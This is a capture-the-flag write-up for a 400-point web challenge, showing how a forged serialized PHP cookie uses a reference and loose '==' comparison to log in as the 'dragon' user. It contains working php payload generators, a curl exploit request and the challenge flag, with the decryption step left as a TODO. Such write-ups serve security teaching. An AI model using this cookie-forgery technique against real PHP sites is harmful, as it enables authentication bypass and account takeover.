# CONFidence DS CTF Teaser: Web400

**Category:** Web
**Points:** 400
**Description:**

> Fiery Technologies has created a new login system, where all secret messages are encoded. Please, check if you can bypass the authorization and read dragon's private stuff: <http://23.253.207.102/>

## Write-up

The website says:

> **You're not logged in.**
>
> Welcome to our new security system. You can try the demo version of the script here. For sure you'll be pleased.
>
> Use below credentials to try out our unbreakable message system:
>
> « guest:guest »
>
> We'll be looking forward your order.

Logging in with username `guest` and password `guest`, we get another message:

> You're logged in as guest!
> Source code of our newest system is available here:
>
> [« demo.zip &raquo;](demo)

[Unzipping this `demo.zip` file](demo) reveals some parts of the website’s source code.

[`database.php`](demo/database.php) contains the following:

```php
<?php

$database = array(

  array(
    'username' => 'guest',
    'password' => '084e0343a0486ff05530df6c705c8bb4',
    'secret_message' =>
    'ae7d55f7e2af728e7408d50677324732bca66dbd49f7b5f02956a0cc948648c715c6e988c8a178ba0b3b7aea83911b4ba8560831af16bfc8c6aa0f30f94c4fd5013b63d44364ea6f365cf059a3c8f8a6887944152af1de6e187248595ab9956a7479890a5e6ed4e95ff7e136b54030f8c239b33d042f5811f76af989ef0bd09e2b0a5619179f9ec2790f3a89f249769a207619d3b4c8c7384d91429ed07820206fcd127dc6cb873bb19395eaa385799fda5cf3e8ff6d094a6c7a8cb385320083ce2494800b1195a727b2e0ebf3f88e9a3220600ca024d5ebdbd680b3e13c660a'
  ),

  array(
    'username' => 'dragon',
    'password' => '[put md5 of your secret password here]',
    'secret_message' =>
    '[order the full version of the script to get encryption module]'
  )

);
```

The first item checks out – `084e0343a0486ff05530df6c705c8bb4` is the MD5 hash of `guest`, the password for the `guest` account we just used to login. The second array item is missing the juicy info, but at least now we know the username of the account we’re supposed to hack in to: `dragon`.

[The `auth.php` file](demo/auth.php) determines whether a login was successful or not:

```php
$auth = $_COOKIE['auth'];
if(get_magic_quotes_gpc())
  $auth = stripslashes($auth);
$auth = unserialize($auth);

if(!is_array($auth))
  return false;

$auth['hmac_t'] = sha1(sha1($auth['username'].$auth['hmac_t'].$auth['password']).$secret_salt);

if($auth['hmac_t'] !== $auth['hmac'])
  return false;
```

As we can see, the value of the `auth` cookie gets `unserialize()`d. There is a subtle unsafe unserialization vulnerability here that allows us to bypass the `$auth['hmac_t'] === $auth['hmac'])` check: since we control the value of the `auth` cookie, we can control the value of `$auth`, [as long as it’s an array](demo/auth.php#L11-12).

The [PHP `serialize()` documentation](http://php.net/serialize) contains this nugget:

> `serialize()` handles all types, except the resource-type. You can even `serialize()` arrays that contain references to itself. Circular references inside the array/object you are serializing will also be stored. Any other reference will be lost.

In this case, we can construct a custom array with the expected `username`, `password`, and `hmac` fields, and then add a `hmac_t` field that references the `hmac` field directly. The value for the `hmac` field doesn’t even matter:

```bash
$ php -r '$a = array("username" => "dragon", "password" => "???", "hmac" => "https://github.com/ctfs/write-ups"); $a["hmac_t"] = &$a["hmac"]; echo urlencode(serialize($a)) . "\n";'
a%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22dragon%22%3Bs%3A8%3A%22password%22%3Bs%3A3%3A%22%3F%3F%3F%22%3Bs%3A4%3A%22hmac%22%3Bs%3A33%3A%22https%3A%2F%2Fgithub.com%2Fctfs%2Fwrite-ups%22%3Bs%3A6%3A%22hmac_t%22%3BR%3A4%3B%7D
```

Using this as the value of the `auth` cookie, we effectively bypass the `$auth['hmac_t'] === $auth['hmac'])` check. We’re still not logged in however, because of this code:

```php
$message = '';

foreach($database as $row)
{
  if($row['username'] == $auth['username'])
  if($row['password'] == $auth['password'])
  {
    $message = $row['secret_message'];
    return true;
  }
}

return false;
```

We know the expected username is `dragon`, so the `if($row['username'] == $auth['username'])` check is not a problem. We still need to make sure `$row['password'] == $auth['password']` holds true, though. `$row['password']` holds the MD5 hash of the password for the user `dragon` – a value we don’t know. How can we make our `$auth['password']` value be equal to it without knowing the right value? Luckily, [PHP’s crazy `==` operator](http://gynvael.coldwind.pl/?id=492) is being used here rather than the more sensical `===`. This allows us to use a non-string value for `$auth['password']` that will still equal any string, such as the boolean `true`. (Seriously, check out that last link link for more examples. PHP is crazy.)

```bash
$ php -r '$a = array("username" => "dragon", "password" => true, "hmac" => "https://github.com/ctfs/write-ups"); $a["hmac_t"] = &$a["hmac"]; echo urlencode(serialize($a)) . "\n";'
a%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22dragon%22%3Bs%3A8%3A%22password%22%3Bb%3A1%3Bs%3A4%3A%22hmac%22%3Bs%3A33%3A%22https%3A%2F%2Fgithub.com%2Fctfs%2Fwrite-ups%22%3Bs%3A6%3A%22hmac_t%22%3BR%3A4%3B%7D
```

Using this as the value of the `auth` cookie, we’re successfully logged in as the `dragon` user!

```bash
$ curl --cookie 'auth=a%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22dragon%22%3Bs%3A8%3A%22password%22%3Bb%3A1%3Bs%3A4%3A%22hmac%22%3Bs%3A33%3A%22https%3A%2F%2Fgithub.com%2Fctfs%2Fwrite-ups%22%3Bs%3A6%3A%22hmac_t%22%3BR%3A4%3B%7D' 'http://23.253.207.102/' > message.html
```

The response ([available as `message.html`](message.html)) contains the following message:

```bash
$ hexdump -C -s 0x520 message.html | head -n 23
00000520  64 69 76 20 63 6c 61 73  73 3d 22 63 6f 6e 74 61  |div class="conta|
00000530  69 6e 65 72 22 3e 0a 83  b3 6a 91 15 3e 36 d6 45  |iner">...j..>6.E|
00000540  b3 cc 5b 24 e3 49 c4 d5  f8 6a dd 64 85 7e 1b 6d  |..[$.I...j.d.~.m|
00000550  6c 04 8a eb d5 47 bd c8  05 ab d8 64 8c 37 d6 45  |l....G.....d.7.E|
00000560  7b 03 4e 09 7d f4 bd 83  b3 6a 91 15 3e 53 26 47  |{.N.}....j..>S&G|
00000570  8f 0a 8b 32 e6 36 11 d8  ff ab e5 5e 8d 85 29 2a  |...2.6.....^..)*|
00000580  6b f4 8c 40 9b 4b 02 83  f9 b9 e6 63 82 37 2a 71  |k..@.K.....c.7*q|
00000590  b0 bb 83 37 d5 3b d7 9f  c2 ba ae ff 3e 36 d6 29  |...7.;......>6.)|
000005a0  6b bb 3c eb b0 44 db 9f  f4 6a d4 61 7f 8a 29 46  |k.<..D...j.a..)F|
000005b0  6d fd 91 39 94 37 11 d1  c0 ba e3 5e 8b 78 28 82  |m..9.7.....^.x(.|
000005c0  6b fd 91 39 a1 41 04 85  b3 bc e0 61 83 53 d8 6b  |k..9.A.....a.S.k|
000005d0  c1 0f 91 3a e1 f6 bd cc  05 af d7 32 40 81 17 7f  |...:.......2@...|
000005e0  ad 0e 80 3d dd 45 11 9e  09 b9 da 59 46 87 28 78  |...=.E.....YF.(x|
000005f0  b9 0b 90 f3 9b 29 05 c8  b3 90 dd 56 85 3d e2 30  |.....).....V.=.0|
00000600  90 0d 84 39 c7 4f cf 9c  ca 7b d7 2d 54 7d 19 40  |...9.O...{.-T}.@|
00000610  ac cc 52 fc d8 09 ce 97  f8 81 d5 57 82 78 1a 3e  |..R........W.x.>|
00000620  af fd 83 2c a6 0b 1a 8a  bc 73 93 33 44 83 17 7a  |...,.....s.3D..z|
00000630  c1 0a 57 eb b8 47 04 d1  e6 c5 a3 2e 55 48 1c 41  |..W..G......UH.A|
00000640  82 01 80 02 d5 05 d3 94  f7 7f a2 29 83 4e 1a 6b  |...........).N.k|
00000650  af fc 81 00 d8 37 03 c4  c5 80 ee 15 44 89 17 7a  |.....7......D..z|
00000660  c1 0a 58 07 a3 35 db 63  93 4a 70 f5 1e 16 b6 09  |..X..5.c.Jp.....|
00000670  4b 9b 1d 07 a3 44 db 0a  20 20 20 20 20 20 3c 2f  |K....D..      </|
00000680  64 69 76 3e 0a 20 20 20  20 3c 2f 64 69 76 3e 0a  |div>.    </div>.|
```

The message is garbled because it has been decrypted using the incorrect password we provided. Looks like we’re gonna have to reverse [the `printmsg()` function in `message.php`](demo/message.php).

(TODO)

The flag is `DrgnS{2971f86fc7a161d514e7dbdad5dbfa26}`.

## Other write-ups and resources

* [Write-up by Rentjong (auto-translated)](https://translate.google.com/translate?hl=en&sl=id&tl=en&u=http%3A%2F%2Frentjong-team.blogspot.com%2F2014%2F04%2Fconfidence-dragon-sector-ctf-teaser.html)
* [Solution by phiber](https://gist.github.com/anonymous/c40c5e90482eed1151e5)
